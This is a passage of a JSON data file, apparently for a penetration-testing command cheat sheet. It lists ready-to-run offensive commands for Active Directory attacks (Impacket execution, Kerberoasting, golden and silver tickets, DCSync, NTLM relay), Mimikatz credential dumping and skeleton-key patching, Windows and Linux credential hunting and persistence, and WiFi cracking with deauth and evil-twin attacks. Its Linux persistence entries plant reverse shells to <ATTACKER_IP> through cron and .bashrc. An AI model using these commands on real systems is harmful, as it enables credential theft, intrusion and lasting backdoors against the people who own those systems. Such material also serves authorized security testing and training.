          { "title": "WMIExec Remote Shell", "desc": "Get shell via WMI (semi-interactive)", "cmd": "wmiexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["essential","tool"] },
          { "title": "WMIExec with Hash", "desc": "WMIExec using NTLM hash", "cmd": "wmiexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>", "tags": ["essential"] },
          { "title": "SMBExec Remote Shell", "desc": "Get SYSTEM shell via SMB service creation", "cmd": "smbexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["tool"] },
          { "title": "AtExec Command", "desc": "Execute command via Task Scheduler", "cmd": "atexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP> 'whoami'", "tags": ["tool"] },
          { "title": "DCOMExec Remote Shell", "desc": "Execute via DCOM (MMC20)", "cmd": "dcomexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["advanced"] }
        ]
      },
      {
        "name": "Kerberos Attacks",
        "commands": [
          { "title": "GetUserSPNs (Kerberoast)", "desc": "Get TGS tickets for Kerberoasting", "cmd": "GetUserSPNs.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request", "tags": ["essential","tool"] },
          { "title": "GetUserSPNs with Hash", "desc": "Kerberoast using NTLM hash", "cmd": "GetUserSPNs.py -hashes :<NTLM_HASH> <DOMAIN>/<USER> -dc-ip <DC_IP> -request", "tags": ["tool"] },
          { "title": "GetNPUsers (ASREPRoast)", "desc": "Get AS-REP hashes for roasting", "cmd": "GetNPUsers.py <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP> -format hashcat", "tags": ["essential","tool"] },
          { "title": "GetNPUsers Single User", "desc": "AS-REP roast a specific user", "cmd": "GetNPUsers.py <DOMAIN>/<USER> -no-pass -dc-ip <DC_IP> -format hashcat", "tags": ["essential"] },
          { "title": "getTGT Get Ticket", "desc": "Get TGT for a user", "cmd": "getTGT.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>", "tags": ["tool"] },
          { "title": "getST S4U (Delegation)", "desc": "Get service ticket via S4U2Self/S4U2Proxy", "cmd": "getST.py -spn <SERVICE>/<TARGET> -impersonate administrator <DOMAIN>/<USER>:'<PASS>'", "tags": ["advanced"] },
          { "title": "Ticketer Silver Ticket", "desc": "Forge silver ticket", "cmd": "ticketer.py -nthash <SERVICE_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE>/<TARGET> administrator", "tags": ["advanced"] },
          { "title": "Ticketer Golden Ticket", "desc": "Forge golden ticket with krbtgt hash", "cmd": "ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> administrator", "tags": ["advanced"] },
          { "title": "Use Kerberos Ticket", "desc": "Export ticket for use with Impacket", "cmd": "export KRB5CCNAME=administrator.ccache", "tags": ["essential"] }
        ]
      },
      {
        "name": "Credential Dumping",
        "commands": [
          { "title": "SecretsDump Remote SAM", "desc": "Dump SAM and LSA secrets remotely", "cmd": "secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["essential","tool"] },
          { "title": "SecretsDump with Hash", "desc": "Dump secrets using NTLM hash", "cmd": "secretsdump.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>", "tags": ["essential"] },
          { "title": "SecretsDump DCSync", "desc": "DCSync to get all domain hashes", "cmd": "secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc-ntlm", "tags": ["essential"] },
          { "title": "SecretsDump Just NTLM", "desc": "Get only NTLM hashes from DC", "cmd": "secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc-ntlm -outputfile hashes.txt", "tags": ["essential"] },
          { "title": "SecretsDump from NTDS", "desc": "Dump from copied NTDS.dit file", "cmd": "secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL", "tags": ["advanced"] }
        ]
      },
      {
        "name": "Network Attacks",
        "commands": [
          { "title": "NTLM Relay Setup", "desc": "Relay NTLM auth to execute commands", "cmd": "ntlmrelayx.py -t smb://<TARGET_IP> -smb2support", "tags": ["essential","tool"] },
          { "title": "NTLM Relay Interactive Shell", "desc": "Get interactive SMB shell via relay", "cmd": "ntlmrelayx.py -t smb://<TARGET_IP> -smb2support -i", "tags": ["tool"] },
          { "title": "NTLM Relay Execute Command", "desc": "Execute command via relay", "cmd": "ntlmrelayx.py -t smb://<TARGET_IP> -smb2support -c 'whoami'", "tags": ["tool"] },
          { "title": "NTLM Relay to LDAP (DA)", "desc": "Relay to LDAP to add user to DA", "cmd": "ntlmrelayx.py -t ldaps://<DC_IP> --delegate-access -smb2support", "tags": ["advanced"] },
          { "title": "NTLM Relay MultiRelay", "desc": "Relay to multiple targets from list", "cmd": "ntlmrelayx.py -tf targets.txt -smb2support", "tags": ["tool"] },
          { "title": "Responder Start", "desc": "Start Responder to capture NTLM hashes", "cmd": "sudo responder -I <INTERFACE> -wPv", "tags": ["essential","tool"] },
          { "title": "Responder without SMB/HTTP", "desc": "Run Responder while ntlmrelayx is active", "cmd": "sudo responder -I <INTERFACE> -wd", "tags": ["essential"], "note": "Disable SMB and HTTP in /etc/responder/Responder.conf first" },
          { "title": "Mitm6 IPv6 Poisoning", "desc": "IPv6 DNS takeover for NTLM capture", "cmd": "sudo mitm6 -d <DOMAIN>", "tags": ["advanced","tool"] }
        ]
      },
      {
        "name": "LDAP / AD Tools",
        "commands": [
          { "title": "FindDelegation", "desc": "Find delegation configurations", "cmd": "findDelegation.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>", "tags": ["essential","tool"] },
          { "title": "GetADUsers", "desc": "Enumerate AD users", "cmd": "GetADUsers.py -all <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>", "tags": ["essential"] },
          { "title": "Lookupsid RID Brute", "desc": "Enumerate users via SID/RID brute force", "cmd": "lookupsid.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["essential"] },
          { "title": "Samrdump User Enum", "desc": "Enumerate users via SAMR protocol", "cmd": "samrdump.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["tool"] },
          { "title": "Reg.py Registry Query", "desc": "Remote registry queries", "cmd": "reg.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP> query -keyName 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'", "tags": ["tool"] }
        ]
      }
    ]
  },
  {
    "id": "mimikatz",
    "name": "Mimikatz Commands",
    "icon": "🐱",
    "description": "Mimikatz credential extraction, Kerberos ticket manipulation, and Windows credential attacks.",
    "subcategories": [
      {
        "name": "Credential Extraction",
        "commands": [
          { "title": "Privilege Debug", "desc": "Elevate to debug privilege (required for most modules)", "cmd": "privilege::debug", "tags": ["essential"] },
          { "title": "Sekurlsa LogonPasswords", "desc": "Dump cleartext passwords and NTLM hashes from LSASS", "cmd": "sekurlsa::logonpasswords", "tags": ["essential"] },
          { "title": "Sekurlsa WDIGEST", "desc": "Show WDigest credentials (cleartext if enabled)", "cmd": "sekurlsa::wdigest", "tags": ["tool"] },
          { "title": "Sekurlsa MSVCACHE", "desc": "Dump cached domain credentials", "cmd": "sekurlsa::msv", "tags": ["tool"] },
          { "title": "Sekurlsa Kerberos Tickets", "desc": "List Kerberos tickets in memory", "cmd": "sekurlsa::kerberos", "tags": ["essential"] },
          { "title": "Sekurlsa All Creds", "desc": "Dump all credential types at once", "cmd": "sekurlsa::logonpasswords full", "tags": ["essential"] },
          { "title": "Sekurlsa DPAPI Keys", "desc": "Extract DPAPI master keys", "cmd": "sekurlsa::dpapi", "tags": ["advanced"] },
          { "title": "Enable WDigest", "desc": "Force WDigest to cache cleartext creds", "cmd": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1", "tags": ["advanced"], "note": "Requires re-login to take effect" }
        ]
      },
      {
        "name": "SAM & LSA Dumps",
        "commands": [
          { "title": "LSADUMP SAM", "desc": "Dump local SAM hashes", "cmd": "lsadump::sam", "tags": ["essential"] },
          { "title": "LSADUMP LSA Patch", "desc": "Dump LSA secrets using patch method", "cmd": "lsadump::lsa /patch", "tags": ["essential"] },
          { "title": "LSADUMP DCSYNC", "desc": "DCSync attack — dump specific user hash", "cmd": "lsadump::dcsync /domain:<DOMAIN> /user:administrator", "tags": ["essential"] },
          { "title": "LSADUMP DCSYNC All", "desc": "DCSync all domain hashes", "cmd": "lsadump::dcsync /domain:<DOMAIN> /all /csv", "tags": ["advanced"] },
          { "title": "LSADUMP Secrets", "desc": "Dump LSA secrets (service account creds, DPAPI)", "cmd": "lsadump::secrets", "tags": ["essential"] },
          { "title": "LSADUMP Cache", "desc": "Dump cached domain credentials", "cmd": "lsadump::cache", "tags": ["tool"] }
        ]
      },
      {
        "name": "Kerberos Tickets",
        "commands": [
          { "title": "Kerberos List Tickets", "desc": "List all Kerberos tickets", "cmd": "kerberos::list /export", "tags": ["essential"] },
          { "title": "Kerberos Pass-the-Ticket", "desc": "Inject a .kirbi ticket into session", "cmd": "kerberos::ptt <TICKET.kirbi>", "tags": ["essential"] },
          { "title": "Kerberos Purge Tickets", "desc": "Remove all Kerberos tickets from memory", "cmd": "kerberos::purge", "tags": ["tool"] },
          { "title": "Golden Ticket", "desc": "Create a golden ticket", "cmd": "kerberos::golden /user:administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt", "tags": ["advanced"] },
          { "title": "Silver Ticket", "desc": "Create a silver ticket for a service", "cmd": "kerberos::golden /user:administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:<SERVICE> /rc4:<SERVICE_HASH> /ptt", "tags": ["advanced"] },
          { "title": "Overpass-the-Hash", "desc": "Use NTLM hash to get a Kerberos TGT", "cmd": "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe", "tags": ["essential"] }
        ]
      },
      {
        "name": "Misc Mimikatz",
        "commands": [
          { "title": "Process Inject into LSASS", "desc": "Inject into LSASS process for credential access", "cmd": "privilege::debug\nsekurlsa::logonpasswords", "tags": ["essential"] },
          { "title": "Vault Credentials", "desc": "Dump Windows Vault credentials", "cmd": "vault::cred /patch", "tags": ["tool"] },
          { "title": "Vault List", "desc": "List Windows Vault entries", "cmd": "vault::list", "tags": ["tool"] },
          { "title": "Crypto Export Certs", "desc": "Export all certificates from stores", "cmd": "crypto::certificates /export", "tags": ["advanced"] },
          { "title": "Misc SkeltonKey", "desc": "Patch DC to allow skeleton key password", "cmd": "misc::skeleton", "tags": ["advanced"], "note": "Allows logging in with 'mimikatz' as any user's password — AD-wide" }
        ]
      }
    ]
  },
  {
    "id": "post-exploitation-win",
    "name": "Windows Post-Exploitation",
    "icon": "🪟",
    "description": "Windows post-exploitation — situational awareness, persistence, data gathering, and privilege escalation after initial foothold.",
    "subcategories": [
      {
        "name": "Situational Awareness",
        "commands": [
          { "title": "Full System Info", "desc": "Get OS, hostname, and patch level", "cmd": "systeminfo", "tags": ["essential"] },
          { "title": "Current User & Groups", "desc": "Show current user and group memberships", "cmd": "whoami /all", "tags": ["essential"] },
          { "title": "Net Users", "desc": "List local users", "cmd": "net user", "tags": ["essential"] },
          { "title": "Net Local Groups", "desc": "List local groups", "cmd": "net localgroup", "tags": ["essential"] },
          { "title": "Local Admins", "desc": "List local administrator group members", "cmd": "net localgroup administrators", "tags": ["essential"] },
          { "title": "Domain Users", "desc": "List domain users", "cmd": "net user /domain", "tags": ["essential"] },
          { "title": "Domain Groups", "desc": "List domain groups", "cmd": "net group /domain", "tags": ["essential"] },
          { "title": "Domain Controllers", "desc": "Find domain controllers", "cmd": "net group 'Domain Controllers' /domain", "tags": ["essential"] },
          { "title": "Network Interfaces", "desc": "Show all network interfaces and IPs", "cmd": "ipconfig /all", "tags": ["essential"] },
          { "title": "ARP Table", "desc": "Show ARP cache for host discovery", "cmd": "arp -a", "tags": ["essential"] },
          { "title": "Routing Table", "desc": "Show routing table", "cmd": "route print", "tags": ["essential"] },
          { "title": "Listening Ports", "desc": "Show all listening ports", "cmd": "netstat -ano | findstr LISTENING", "tags": ["essential"] },
          { "title": "Active Connections", "desc": "Show all active connections", "cmd": "netstat -ano", "tags": ["essential"] },
          { "title": "Running Processes", "desc": "List all running processes with PID", "cmd": "tasklist /v", "tags": ["essential"] },
          { "title": "Processes with Network", "desc": "Match processes to network connections", "cmd": "netstat -ano | findstr :<PORT>", "tags": ["tool"] },
          { "title": "Installed Software", "desc": "List installed programs", "cmd": "wmic product get name,version", "tags": ["essential"] },
          { "title": "Installed Patches", "desc": "List installed Windows patches", "cmd": "wmic qfe get Caption,Description,HotFixID,InstalledOn", "tags": ["essential"] },
          { "title": "Scheduled Tasks", "desc": "List all scheduled tasks", "cmd": "schtasks /query /fo LIST /v", "tags": ["essential"] },
          { "title": "Services Running", "desc": "List running services", "cmd": "sc query type= all state= running", "tags": ["essential"] },
          { "title": "PowerShell History", "desc": "Read PowerShell command history", "cmd": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt", "tags": ["essential"] },
          { "title": "Environment Variables", "desc": "Show all environment variables", "cmd": "set", "tags": ["tool"] },
          { "title": "Firewall Status", "desc": "Check Windows Firewall status", "cmd": "netsh advfirewall show allprofiles", "tags": ["tool"] },
          { "title": "AV Installed", "desc": "Check installed antivirus via WMI", "cmd": "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname", "tags": ["essential"] }
        ]
      },
      {
        "name": "Credential Hunting",
        "commands": [
          { "title": "Search for Passwords in Files", "desc": "Search all files for password string", "cmd": "findstr /s /i /m \"password\" C:\\*.txt C:\\*.xml C:\\*.ini C:\\*.config", "tags": ["essential"] },
          { "title": "Search Specific Extensions", "desc": "Find potentially sensitive files", "cmd": "dir /s /b *.txt *.xml *.config *.ini *.ps1 *.bat 2>nul", "tags": ["essential"] },
          { "title": "Registry Passwords", "desc": "Search registry for password strings", "cmd": "reg query HKLM /f password /t REG_SZ /s", "tags": ["essential"] },
          { "title": "Registry Passwords HKCU", "desc": "Search HKCU for passwords", "cmd": "reg query HKCU /f password /t REG_SZ /s", "tags": ["essential"] },
          { "title": "Unattend Files", "desc": "Look for unattended installation files", "cmds": ["type C:\\Windows\\Panther\\Unattend.xml", "type C:\\Windows\\Panther\\Unattend\\Unattend.xml", "type C:\\Windows\\system32\\sysprep\\Unattend.xml"], "tags": ["essential"] },
          { "title": "SAM & SYSTEM Files", "desc": "Copy SAM/SYSTEM for offline cracking", "cmds": ["reg save HKLM\\SAM C:\\Temp\\sam.hive", "reg save HKLM\\SYSTEM C:\\Temp\\system.hive"], "tags": ["essential"] },
          { "title": "DPAPI Blob Hunt", "desc": "Find DPAPI blobs (credential files)", "cmd": "dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\*", "tags": ["advanced"] },
          { "title": "WiFi Passwords", "desc": "Dump saved WiFi passwords", "cmd": "for /f \"tokens=2 delims=:\" %i in ('netsh wlan show profiles ^| findstr Profile') do netsh wlan show profile name=%i key=clear", "tags": ["tool"] },
          { "title": "PuTTY Saved Sessions", "desc": "Check PuTTY for saved credentials", "cmd": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s", "tags": ["tool"] },
          { "title": "Chrome Credentials", "desc": "Find Chrome password database", "cmd": "dir /s /b \"%APPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\"", "tags": ["tool"] },
          { "title": "IIS Web.config", "desc": "Look for credentials in IIS config", "cmds": ["type C:\\inetpub\\wwwroot\\web.config", "type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config"], "tags": ["essential"] }
        ]
      },
      {
        "name": "Windows Persistence",
        "commands": [
          { "title": "Registry Run Key (User)", "desc": "Add persistence via HKCU Run key", "cmd": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v <NAME> /t REG_SZ /d 'C:\\Temp\\payload.exe'", "tags": ["essential"] },
          { "title": "Registry Run Key (System)", "desc": "Add persistence via HKLM Run key (requires admin)", "cmd": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v <NAME> /t REG_SZ /d 'C:\\Temp\\payload.exe'", "tags": ["essential"] },
          { "title": "Scheduled Task Persistence", "desc": "Create scheduled task for persistence", "cmd": "schtasks /create /tn <TASK_NAME> /tr C:\\Temp\\payload.exe /sc ONLOGON /ru SYSTEM", "tags": ["essential"] },
          { "title": "New Service", "desc": "Create new Windows service for persistence", "cmds": ["sc create <SERVICE_NAME> binpath= 'C:\\Temp\\payload.exe' start= auto", "sc start <SERVICE_NAME>"], "tags": ["advanced"] },
          { "title": "Startup Folder User", "desc": "Place payload in user startup folder", "cmd": "copy C:\\Temp\\payload.exe %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", "tags": ["tool"] },
          { "title": "Startup Folder Global", "desc": "Place payload in global startup folder (admin)", "cmd": "copy C:\\Temp\\payload.exe 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\'", "tags": ["tool"] }
        ]
      },
      {
        "name": "Token & Impersonation",
        "commands": [
          { "title": "List Privileges (whoami)", "desc": "Check current token privileges", "cmd": "whoami /priv", "tags": ["essential"] },
          { "title": "Incognito List Tokens", "desc": "List available impersonation tokens", "cmd": "list_tokens -u", "tags": ["tool"], "note": "Run in Meterpreter with load incognito" },
          { "title": "Incognito Impersonate", "desc": "Impersonate a listed token", "cmd": "impersonate_token '<DOMAIN>\\<USER>'", "tags": ["tool"] },
          { "title": "PrintSpoofer (SeImpersonate)", "desc": "Escalate via SeImpersonatePrivilege", "cmd": "PrintSpoofer.exe -i -c cmd.exe", "tags": ["essential"] },
          { "title": "GodPotato (SeImpersonate)", "desc": "NT AUTHORITY\\SYSTEM via SeImpersonate", "cmd": "GodPotato.exe -cmd 'cmd.exe /c whoami > C:\\Temp\\out.txt'", "tags": ["essential"] },
          { "title": "JuicyPotatoNG", "desc": "Token impersonation for SYSTEM", "cmd": "JuicyPotatoNG.exe -t * -p C:\\Temp\\payload.exe", "tags": ["tool"] },
          { "title": "RunAs Different User", "desc": "Run process as different user", "cmd": "runas /user:<DOMAIN>\\<USER> cmd.exe", "tags": ["essential"] },
          { "title": "RunAs with Saved Cred", "desc": "Run as user with saved credentials", "cmd": "runas /savecred /user:<DOMAIN>\\<USER> cmd.exe", "tags": ["tool"] }
        ]
      }
    ]
  },
  {
    "id": "post-exploitation-linux",
    "name": "Linux Post-Exploitation",
    "icon": "🐧",
    "description": "Linux post-exploitation — situational awareness, credential hunting, persistence, and lateral movement.",
    "subcategories": [
      {
        "name": "Situational Awareness",
        "commands": [
          { "title": "Current User Info", "desc": "Show current user and all groups", "cmd": "id && whoami", "tags": ["essential"] },
          { "title": "System Info", "desc": "OS version and kernel", "cmd": "uname -a && cat /etc/os-release", "tags": ["essential"] },
          { "title": "All Users", "desc": "List all system users", "cmd": "cat /etc/passwd | grep -v nologin | grep -v false", "tags": ["essential"] },
          { "title": "Sudo Rights", "desc": "Check sudo permissions", "cmd": "sudo -l", "tags": ["essential"] },
          { "title": "Network Interfaces", "desc": "Show all network interfaces", "cmd": "ip a", "tags": ["essential"] },
          { "title": "Routing Table", "desc": "Show routing table", "cmd": "ip route", "tags": ["essential"] },
          { "title": "ARP Cache", "desc": "Show ARP table for host discovery", "cmd": "arp -a || ip neigh", "tags": ["essential"] },
          { "title": "Listening Ports", "desc": "Show all listening ports", "cmd": "ss -tlnp", "tags": ["essential"] },
          { "title": "All Connections", "desc": "Show all active network connections", "cmd": "ss -tulnp", "tags": ["essential"] },
          { "title": "Running Processes", "desc": "List all processes with details", "cmd": "ps auxf", "tags": ["essential"] },
          { "title": "Processes as Root", "desc": "Find processes running as root", "cmd": "ps aux | grep root", "tags": ["essential"] },
          { "title": "Cron Jobs", "desc": "Check all cron job files", "cmds": ["crontab -l", "cat /etc/crontab", "ls /etc/cron*"], "tags": ["essential"] },
          { "title": "Bash History", "desc": "Read command history", "cmd": "cat ~/.bash_history && cat ~/.zsh_history 2>/dev/null", "tags": ["essential"] },
          { "title": "Recently Modified Files", "desc": "Find files modified in last 10 minutes", "cmd": "find / -mmin -10 -type f 2>/dev/null | grep -v proc", "tags": ["tool"] },
          { "title": "Writable Directories", "desc": "Find world-writable directories", "cmd": "find / -writable -type d 2>/dev/null | grep -v proc", "tags": ["essential"] },
          { "title": "Mounted Filesystems", "desc": "Show all mounted filesystems", "cmd": "mount | column -t", "tags": ["tool"] },
          { "title": "SUID Files", "desc": "Find SUID binaries", "cmd": "find / -perm -u=s -type f 2>/dev/null", "tags": ["essential"] },
          { "title": "SGID Files", "desc": "Find SGID binaries", "cmd": "find / -perm -g=s -type f 2>/dev/null", "tags": ["essential"] },
          { "title": "Capabilities", "desc": "Find binaries with special capabilities", "cmd": "getcap -r / 2>/dev/null", "tags": ["essential"] }
        ]
      },
      {
        "name": "Credential Hunting",
        "commands": [
          { "title": "Search for Passwords", "desc": "Recursive search for password strings", "cmd": "grep -rni 'password\\|passwd\\|secret\\|credentials' /home /etc /var/www 2>/dev/null", "tags": ["essential"] },
          { "title": "SSH Private Keys", "desc": "Find all SSH private keys", "cmd": "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null", "tags": ["essential"] },
          { "title": "Config Files", "desc": "Find all .conf and .config files", "cmd": "find / -name '*.conf' -o -name '*.config' 2>/dev/null | grep -v proc", "tags": ["essential"] },
          { "title": "Web App Configs", "desc": "Find web application config files", "cmd": "find /var/www /srv /opt -name '*.php' -o -name '*.conf' -o -name '*.env' 2>/dev/null | xargs grep -l 'password\\|passwd\\|DB_PASS' 2>/dev/null", "tags": ["essential"] },
          { "title": "MySQL Credentials", "desc": "Find MySQL config with credentials", "cmd": "cat /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null; find / -name '.my.cnf' 2>/dev/null | xargs cat", "tags": ["tool"] },
          { "title": "WordPress Config", "desc": "Find WordPress database credentials", "cmd": "find / -name 'wp-config.php' 2>/dev/null | xargs cat", "tags": ["tool"] },
          { "title": "Shadow File", "desc": "Read /etc/shadow if accessible", "cmd": "cat /etc/shadow", "tags": ["essential"] },
          { "title": "Stored SSH Keys", "desc": "Find authorized_keys files", "cmd": "find / -name 'authorized_keys' 2>/dev/null", "tags": ["tool"] },
          { "title": "History Files", "desc": "Find all shell history files", "cmd": "find / -name '*.history' -o -name '.bash_history' -o -name '.zsh_history' 2>/dev/null | xargs cat", "tags": ["essential"] },
          { "title": "Last Login", "desc": "Show last login info", "cmd": "last && lastlog", "tags": ["tool"] }
        ]
      },
      {
        "name": "Linux Persistence",
        "commands": [
          { "title": "SSH Key Persistence", "desc": "Add SSH public key to authorized_keys", "cmd": "echo '<SSH_PUBLIC_KEY>' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys", "tags": ["essential"] },
          { "title": "Cron Job Reverse Shell", "desc": "Add cron job for reverse shell persistence", "cmd": "(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1') | crontab -", "tags": ["essential"] },
          { "title": "SUID Bash Copy", "desc": "Create SUID copy of bash for persistence", "cmds": ["cp /bin/bash /tmp/.bash", "chmod +s /tmp/.bash"], "tags": ["advanced"], "note": "Then: /tmp/.bash -p for root shell" },
          { "title": ".bashrc Persistence", "desc": "Add payload to .bashrc for login persistence", "cmd": "echo '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> ~/.bashrc", "tags": ["tool"] },
          { "title": "Systemd Service Persistence", "desc": "Create systemd service for persistence (root)", "cmds": ["echo '[Unit]\\nDescription=My Service\\n[Service]\\nExecStart=/tmp/payload.sh\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/my-service.service", "systemctl enable my-service", "systemctl start my-service"], "tags": ["advanced"] },
          { "title": "LD_PRELOAD Persistence", "desc": "Inject shared library on program execution", "cmd": "echo '/tmp/evil.so' > /etc/ld.so.preload", "tags": ["advanced"] }
        ]
      }
    ]
  },
  {
    "id": "wireless",
    "name": "Wireless Security Testing",
    "icon": "📡",
    "description": "WiFi security testing — WPA/WPA2 cracking, WPS attacks, evil twin, and wireless reconnaissance.",
    "subcategories": [
      {
        "name": "Wireless Reconnaissance",
        "commands": [
          { "title": "Enable Monitor Mode", "desc": "Put wireless interface into monitor mode", "cmd": "sudo airmon-ng start <INTERFACE>", "tags": ["essential"] },
          { "title": "Kill Interfering Processes", "desc": "Kill processes that may interfere with monitor mode", "cmd": "sudo airmon-ng check kill", "tags": ["essential"] },
          { "title": "Scan All Networks", "desc": "Scan and list all nearby WiFi networks", "cmd": "sudo airodump-ng <INTERFACE>mon", "tags": ["essential"] },
          { "title": "Target Specific Network", "desc": "Capture packets from specific network", "cmd": "sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture <INTERFACE>mon", "tags": ["essential"] },
          { "title": "Scan with Kismet", "desc": "Passive wireless scanner with more detail", "cmd": "sudo kismet -c <INTERFACE>", "tags": ["tool"] },
          { "title": "Disable Monitor Mode", "desc": "Restore interface to managed mode", "cmd": "sudo airmon-ng stop <INTERFACE>mon && sudo service NetworkManager restart", "tags": ["essential"] }
        ]
      },
      {
        "name": "WPA/WPA2 Attacks",
        "commands": [
          { "title": "Capture WPA Handshake", "desc": "Capture 4-way handshake from client", "cmd": "sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w handshake <INTERFACE>mon", "tags": ["essential"] },
          { "title": "Deauth to Force Handshake", "desc": "Force client to reconnect and capture handshake", "cmd": "sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>mon", "tags": ["essential"] },
          { "title": "Crack WPA with Aircrack", "desc": "Crack captured WPA handshake", "cmd": "aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt", "tags": ["essential"] },
          { "title": "Convert to Hashcat Format", "desc": "Convert .cap to hashcat format (22000)", "cmd": "hcxpcapngtool -o hash.hc22000 handshake.cap", "tags": ["tool"] },
          { "title": "Crack WPA with Hashcat", "desc": "Crack WPA hash with hashcat", "cmd": "hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule", "tags": ["essential"] },
          { "title": "PMKID Attack", "desc": "Capture PMKID without waiting for handshake", "cmd": "sudo hcxdumptool -o capture.pcapng -i <INTERFACE>mon --enable_status=1", "tags": ["advanced"] },
          { "title": "PMKID Extract Hash", "desc": "Extract PMKID hash from capture", "cmd": "hcxpcapngtool -o pmkid.hc22000 capture.pcapng", "tags": ["advanced"] }
        ]
      },
      {
        "name": "WPS & Other Attacks",
        "commands": [
          { "title": "WPS Scan", "desc": "Scan for WPS-enabled networks", "cmd": "sudo wash -i <INTERFACE>mon", "tags": ["essential"] },
          { "title": "Reaver WPS PIN Attack", "desc": "Brute force WPS PIN", "cmd": "sudo reaver -i <INTERFACE>mon -b <BSSID> -vv", "tags": ["tool"] },
          { "title": "Reaver with Delay", "desc": "WPS attack with delay to avoid lockout", "cmd": "sudo reaver -i <INTERFACE>mon -b <BSSID> -d 2 -r 3:15 -vv", "tags": ["tool"] },
          { "title": "Pixie Dust Attack", "desc": "Offline WPS attack (pixie dust)", "cmd": "sudo reaver -i <INTERFACE>mon -b <BSSID> -K 1 -vv", "tags": ["advanced"] },
          { "title": "Evil Twin (hostapd-wpe)", "desc": "Create rogue AP for credential capture", "cmd": "sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf", "tags": ["advanced"] },
          { "title": "Evil Twin (airbase-ng)", "desc": "Create fake AP with airbase-ng", "cmd": "sudo airbase-ng -e '<SSID>' -c <CHANNEL> <INTERFACE>mon", "tags": ["advanced"] }
        ]
      }
    ]
  }
];
